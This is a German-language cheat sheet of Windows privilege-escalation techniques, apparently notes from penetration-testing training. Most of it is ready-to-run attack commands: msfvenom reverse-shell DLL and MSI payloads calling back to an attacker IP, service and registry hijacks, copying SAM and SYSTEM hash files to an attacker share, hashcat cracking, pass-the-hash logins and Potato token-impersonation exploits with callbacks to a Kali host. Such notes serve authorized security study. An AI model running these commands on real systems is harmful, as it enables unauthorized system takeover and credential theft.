## Kernel Exploits

1. Enumerate Windows Version/patch level (systeminfo)
2. Find matching exploits
3. Compile and run

#### Tools

Windows Exploit Suggester (https://github.com/bitsadmin/wesng)

Commands:

```bash
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
```

------

Watson (https://github.com/rasta-mouse/Watson)

------

Precompiled Kernel Exploits (https://github.com/SecWiki/windows-kernel-exploits)

## Service Exploits (Infos aus z.B. winPEAS)

Achtung: Evtl. Rabbit Hole, wenn man den Service nicht restarten kann!

Service Commands:

```bash
#Config ansehen und prüfen, als welcher Benutzer der Service ausgeführt wird:
sc.exe qc <name>
#Aktuellen Status des Services ansehen:
sc.exe query <name>
#Config eines Service manipulieren:
sc.exe config <name> <option>= <value>
#Service starten/stoppen
net start/stop <name>
```

#### Insecure Service Permissions

Jeder Service hat eine ACL mit entsprechenden Berechtigungen:

```
Harmlos: SERVICE_QUERY_CONFIG,SERVICE_QUERY_STATUS
Nützlich: SERVICE_STOP,SERVICE_START
Awesome: SERVICE_CHANGE_CONFIG,SERVICE_ALL_ACCESS
```

Sofern ein Benutzer die Konfiguration eines Services (auf SYSTEM Rechten) ändern kann, kann die EXE getauscht werden.

Prüfen mit (accesschk muss passende Version sein):

```bash
accesschk.exe /accepteula -uwcqv user <servicename>
sc qc <servicename>
sc query <servicename>
```

![image-20200723235115960](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200723235115960.png)

Service somit umkonfigurieren und starten:

```
sc config <servicename> binpath= "Pfad"
net start <servicename>
```

![image-20200723235600397](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200723235600397.png)

#### Unquoted Service Path

Versuchen, eine Location zu beschreiben, die Windows zuvor ausführen würde.

Beispiel:

```
C:\Program Files\Some Dir\SomeProgram.exe
2 mögliche Startoptionen:
C:\Program (mit 2 Argumenten - Files\Some und Dir\SomeProgram.exe)
C:\Program Files\Some (mit 1 Argument - Dir\SomeProgram.exe)
```

Mittels winPEAS nach Unquoted Service Paths suchen und dann schauen, ob Pfade schreibbar sind:

![image-20200724001017258](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724001017258.png)

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724000904666.png" alt="image-20200724000904666" style="zoom: 67%;" />

![image-20200724001110230](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724001110230.png)

#### Weak Registry Permissions

```bash
#Either
powershell -exec bypass
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
#Or
accesschk /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

Gruppe INTERACTIVE ("sudo" Gruppe) sind alle User, die sich lokal anmelden können. 

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724132531929.png" alt="image-20200724132531929" style="zoom:67%;" />

Nun prüfen, ob man den Service starten kann.

```bash
accesschk.exe /accepteula -ucqv user regsvc
#Suchen nach: (SERVICE_START & SERVICE_STOP)
```

Nun versuchen, den ImagePath zu manipulieren und auf die reverse shell zeigen zu lassen.

```bash
#Prüfen, als welcher User der Service gestartet wird (und wo es grad hinzeigt)
reg query HKLM\CurrentControlSet\services\regsvc
#ImagePath ändern
reg add HKLM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#Zuletzt Service starten
net start regsvc
```

![image-20200724133657422](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724133657422.png)

#### Insecure Service Executables

Wenn ein Executable modifizierbar ist, kann es durch eine eigene EXE ausgetauscht werden kann. Dies kann verifiziert werden mittels:

```bash
accesschk /accepteula -quvw "C:\PathToExecutable"
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724134026353.png" alt="image-20200724134026353" style="zoom: 80%;" />

Anschließend prüfen, ob der Service von jedem gestartet werden kann und in diesem Fall das Executable austauschen (zuvor Backup):

```bash
#Wer kann Service starten/stoppen?
accesschk /accepteula -uvqc filepermsvc
#Backup anlegen
copy "C:\PathToExecutable\filepermservice.exe" C:\temp
#Durch Reverse Shell ersetzen
copy /Y c:\reverse.exe "C:\PathToExecutable\filepermservice.exe"
#Service starten
net start filepermsvc
```

#### DLL Hijacking

DLL wird von einem Service geladen (bevorzugt mit hohen Privileges). Wenn sie mit einem absoluten Pfad geladen wird, könnte sie (sofern beschreibbar) möglicherweise für Privilege Escalation genutzt werden. Überlicherweise fehlt jedoch eine DLL, hier braucht der Benutzer Rechte, einen Ordner aus der PATH zu beschreiben, in welcher Windows nach DLLs sucht. **Leider sehr aufwendig/manuell!**

```bash
#Wer kann Service starten/stoppen?
accesschk /accepteula -uvqc filepermsvc
#Prüfen, wo das executable liegt
sc qc dllsvc
```

Nun das binary auf ein System kopieren, auf welchem man Admin Rechte hat. Hier ProcMon64 als Admin ausführen und das executable öffnen (zuvor Capture stoppen/clearen). Strg+L um Filter zu öffnen: "Process Name - is - executable". Anschließend:

![image-20200724135418513](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724135418513.png)

Nun in der CMD den Service starten

```bash
net start dllsvc
```

Nun nach "Result NAME NOT FOUND" schauen.

![image-20200724135635637](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724135635637.png)

Irgendwann sucht Windows in einem Pfad, der beschreibbar ist (zB C:\temp).

Nun dll mit msfvenom erstellen:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.225 LPORT=53 -f dll -o /hijackme.dll
```

Das File nun in C:\temp kopieren (z.B. mit:

```bash
copy \\192.168.119.225\tools\hijackme.dll C:\temp
```

Service neustarten, done!

## Registry Exploits

#### AutoRuns

Interessant bei commands, welche zum Systemstart mit elevated Privileges ausgeführt werden. AutoRuns sind in der Registry konfiguriert. Wenn man ein AutoRun Executable modifizieren kann und das System neustarten darf, könnten Priviliges elevated werden.

```bash
#winPEAS mit Parameter starten
winPEASany.exe quiet applicationsinfo
#Nach Autorun Applications schauen, welche FilePerms: Everyone [nach AllAccess schauen] besitzen

#Alernative, Autorun Applications ansehen
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#Permissions für Executable ansehen
accesschk.exe /accepteula -wvu "C:\PathToExecutable\program.exe"
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724140604657.png" alt="image-20200724140604657" style="zoom:67%;" />

Nun einfach das Executable ersetzen und Listener starten..

```bash
#Backup anlegen
copy "C:\PathToExecutable\filepermservice.exe" C:\temp
#Durch Reverse Shell ersetzen
copy /Y c:\reverse.exe "C:\PathToExecutable\filepermservice.exe"
#Windows neustarten (Windows 10 scheint den zuletzt angemeldeten Benutzer zu nutzen.......)
```

#### AlwaysInstallElevated

MSI Files werden für Installationen genutzt, welche u.U. mit elevated Privileges durchgeführt werden können. In diesem Fall könnte ein MSI File erstellt werden, welches eine Reverse Shell enthält.

**Funktioniert jedoch nur, wenn zwei bestimmte Registry Keys gesetzt sind!**

Entweder mit winPEAS oder manuell:

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724141704950.png" alt="image-20200724141704950" style="zoom: 80%;" />

Payload generieren:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.225 LPORT=53 -f msi -o reverse.msi
```

Anschließend Listener starten und File auf System kopieren/ausführen:

```bash
copy \\IP\SHARE\reverse.msi .
msiexec /quiet /qn /i reverse.msi
```

## Passwords

Passwörter werden oft unsicher gespeichert. 

#### Registry

Software speichert gern Passwörter in der Registry. Diese könnten wie folgt gefunden werden:

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Da dies extrem viele Einträge ausgibt, lieber in winPEAS suchen (winPEAS.exe)

Wenn Credentials gefunden wurden, könnte von Linux aus eine Shell gespawned werden (bei Admin Credentials sogar als SYSTEM!)

```bash
#Als entsprechender User
winexe -U 'USER%PASS' //WinIP cmd.exe
#Als SYSTEM
winexe -U 'USER%PASS' --system //WinIP cmd.exe
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724143546112.png" alt="image-20200724143546112" style="zoom: 80%;" />

#### Saved Creds

Windows kann mit **runas** u.U. Befehle als Admin ausführen:

```bash
#Zunächst Benutzer mit gespeicherten Credentials anzeigen
cmdkey /list
#Nun als User ausführen
runas /savecred /user:admin C:\reverse.exe
```

#### Configuration Files

Administratoren könnten Config Files mit Credentials am System speichern/vergessen. Beispiel hierfür: **Unattend.xml** (hier Base64 encoded)

```bash
#Bevorzugt nicht aus Root Directory ausführen!
#Rekursiv nach Dateien vom current directory suchen, welche *pass* im Namen haben oder auf *.config* enden:
dir /s *pass* == *.config*
#Rekursiv nach Dateien vom current directory suchen, welche das Wort "password" beinhalten und mit .xml, .ini oder .txt enden
findstr /si password *.xml *.ini *.txt
```

Bei**Unattend.xml** Credentials könnte mittels winexe ein Login möglich sein.

```bash
winexe -U 'USER%PASS' --system //WinIP cmd.exe
```

#### SAM

Windows speichert Passwort Hashes im Security Account Manager (SAM). Der Hash Key kann in der Datei SYSTEM gefunden werden. Wenn diese Dateien ausgelesen werden können, ist eine Password Extraction möglich (Download auf Kali und Hashes decrypten).

Die Dateien befinden sich in:

```bash
#Gesperrt zur Laufzeit
C:\Windows\System32\config
#Mögliche Backup Locations
C:\Windows\Repair
C:\Windows\System32\config\RegBack
#Dateien auf Kali kopieren
copy C:\PathTo\SAM|SYSTEM \\KALI-IP\Share\
```

Normalerweise können Tools wie **samdump** oder **pwdump** für Hash Dumps genutzt werden. Allerdings ist Version auf Kali outdated für Windows 10, daher anderes Tool notwendig:

```bash
git clone https://github.com/Neohapsis/creddump7.git
#Supportet nur python2!
python2 pwdump.py /SYSTEM /SAM
```

![image-20200724150515625](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724150515625.png)

<u>NOTES:</u>

Erster Hash (aad3.....) ist deprecated LM Hash und ist ein leerer String.

Zweiter Hash ist NTLM Hash, wobei Hashes die mit 31d6c... beginnen entweder auf ein leeres Passwort oder einen deaktivierten Benutzer hinweisen.

Cracken kann z.B. mit Hashcat durchgeführt werden....

```bash
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

Einloggen wieder mit winexe möglich...

```bash
winexe -U 'USER%PASS' --system //WinIP cmd.exe
```

#### Pass The Hash

Mit den gefundenen Hashes ist ebenfalls ein direkter Login möglich.

```bash
pth-winexe -U 'admin%LM-Hash:NTLM-Hash' //WIN-IP cmd.exe
```

![image-20200724151231459](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724151231459.png)

Für System Shell:

```
pth-winexe --system -U 'admin%LM-Hash:NTLM-Hash' //WIN-IP cmd.exe
```

## Scheduled Tasks

Scheduled Tasks werden teilweise von Administratoren im Kontext von SYSTEM ausgeführt. Allerdings kann ein low privileged User primär nur seine eigenen Scheduled Tasks sehen:

```bash
#CMD
schtasks /query /fo LIST /v
#Powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Daher werden solche Informationen eher aus Scripts/Log-Files extrahiert..

Beispiel für Scheduled Task:

```bash
#Script anzeigen lassen
type <Filename>
#Prüfen, ob man File beschreiben kann
accesschk.exe /accepteule -quv <Benutzername> <FileName>
echo C:\PathToShell\reverse.exe >> <FileName>
#Warten, bis Script ausgeführt wird..
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724165055332.png" alt="image-20200724165055332" style="zoom:80%;" />



## Insecure GUI Apps

In (älteren) Windows Versionen konnten Benutzer berechtigt werden, bestimmte GUI Apps als Admin auszuführen. Aus diesen gibt es Möglichkeiten, eine Konsole (mit elevated Privileges) zu spawnen.

```bash
#Kontext der Applikation bestimmen
tasklist /V | finstr mspaint.exe
```

In der Applikation (z.B.) **mspaint** eine neue Datei öffnen und in Explorer-Bar eingeben:

```bash
file:c:/windows/system32/cmd.exe
```

## Startup Apps

Sollte ein **Benutzer Schreibrechte im Ordner** haben, welcher die Startup Apps für alle User enthält, so kann bei einem Admin Login eine Reverse Shell mit Adminrechten gestartet werden.

```bash
#Prüfen, ob Benutzer Schreibrechte für dieses Verzeichnis hat
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200724182408185.png" alt="image-20200724182408185" style="zoom:80%;" />

Hierfür kann folgendes VBScript genutzt werden (auf Kali als file.vbs speichern):

```bash
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Temp\test.txt"
oLink.Save
```

Ausführen mit `cscript <filename>` - sobald sich Admin anmeldet, startet reverse shell als Admin

## Installed Apps

Grundsätzlich basieren die meisten Exploits auf bereits gelisteten Problemem (Unquoted Service Paths, Weak File Permissions, etc). Allerdings existieren beispielsweise auch Buffer Overflows. Um Tasks zu identifizieren, welche anfällig sein könnten, gibt es folgende Methoden:

```bash
#Ganz schlecht, da alle Tasks gelistet werden - auch Microsoft Tasks
tasklist
#Besser, da stark gefiltert:
seatbelt NonstandardProcesses
#Alternativ winPEAS..
```

## Hot Potato

Funktioniert auf Windows 7, 8 und frühen Windows 10 Versionen. Windows wird dazu gebracht sich als SYSTEM User bei einem Fake HTTP Server mittels NTLM zu authentifizieren. Die NTLM Credentials werden daraufhin mittels SMB zur Command Execution verwendet.

```bash
potato.exe -ip <WIN-IP> -cmd "C:\PathToShell\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

## Token Impersonation

#### JuicyPotato

Wenn Shell via Service Account ausgeführt wird und bestimmte Privilegien gesetzt sind, können die Rechte ausgweitet werden:

```bash
whoami /priv
#SeImpersonate oder SeAssignPrimaryToken enabled?
JuicyPotato.exe -l 1337 -p C:\PathToShell\reverse.exe -t * -c {CLSID aus JuicyPotato Github}
```

#### Rogue Potato

Ähnlich wie JuicyPotato, jedoch aktueller.

```bash
#Auf Kali einen Forwarder starten
sudo socat tcp-listen:135,reuseaddr,fork tcp:<WIN-IP>:9999
#Auf Kali nc Listener starten
nc -lvnp
#Auf Windows RoguePotato starten
RoguePotato.exe -r <KALI-IP> -l 9999 -e "C:\PathToShell\reverse.exe"
```

#### PrintSpoofer

https://github.com/itm4n/PrintSpoofer

## Port Forwarding

Unter Umständen ist ein Service nur lokal erreichbar. Dies kann mittels Port Forwarding (und plink) umgangen werden.

```bash
#Ursprünglicher Befehl, welcher nicht durchgeht (winexe nutzt Port 445)
winexe -U 'USER%PASS' //WinIP cmd.exe

#SMB Server auf Kali beenden, z.B.
pkill --full smbserver.py
#Sicherstellen, dass der root User sich per SSH verbinden darf
#PermitRootLogin yes setzen und evtl. ssh neustarten
vim /etc/ssh/sshd_config 
#Auf Windows (Remote Port 445 auf Local Port 445 leiten):
plink.exe root@KALI-IP -R 445:127.0.0.1:445
#Auf Kali
winexe -U 'USER%PASS' //127.0.0.1 cmd.exe

```

## Zusätzliche Infos

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services